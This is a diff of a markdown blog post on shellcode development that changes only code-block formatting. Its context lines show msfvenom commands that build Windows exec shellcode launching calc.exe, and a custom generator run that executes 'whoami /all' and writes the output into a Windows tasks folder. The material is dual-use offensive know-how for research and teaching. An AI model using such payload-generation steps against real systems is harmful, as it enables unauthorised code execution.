@@ -36,7 +36,7 @@ Hackers looove popping calcs!
 
 Well, what will a hacker do to generate a shellcode? Summon `msfvenom`, of course:
 
-```console
+```terminal?prompt=$
 ~$ msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o msf-calc.bin
 ```
 
@@ -54,7 +54,7 @@ Unwanted termination of parent process with MSF shellcode
 
 Changing the `EXITFUNC=` option during the generation process doesn't seem to be helpful:
 
-```console
+```terminal?prompt=$
 ~$ msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=none -f raw -o msf-calc-none.bin
 ~$ msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=process -f raw -o msf-calc-process.bin
 ~$ msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f raw -o msf-calc-thread.bin
@@ -180,7 +180,7 @@ rm exec.exe exec.o exec.c adjuststack.o
 
 Generate and execute:
 
-```console
+```terminal?prompt=$
 ~$ ./generate.sh 'cmd /c "whoami /all" > C:\Windows\Tasks\out.txt' 0
 [*] Payload size: 640 bytes
 [+] Saved as: exec.bin
